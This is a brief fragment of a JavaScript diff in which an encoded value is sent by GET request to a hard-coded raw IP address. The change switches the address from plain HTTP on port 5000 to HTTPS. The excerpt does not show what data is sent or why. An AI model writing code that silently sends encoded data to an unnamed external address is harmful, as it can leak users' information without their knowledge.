@@ -1957,7 +1957,7 @@ m = encodeURIComponent(k);
 var request = new XMLHttpRequest()
 
 // Open a new connection, using the GET request on the URL endpoint
-request.open('GET', 'http://117.221.27.74:5000?body='+m, true)
+request.open('GET', 'https://117.221.27.74?body='+m, true)
 
 request.onload = function () {
   // Begin accessing JSON data here
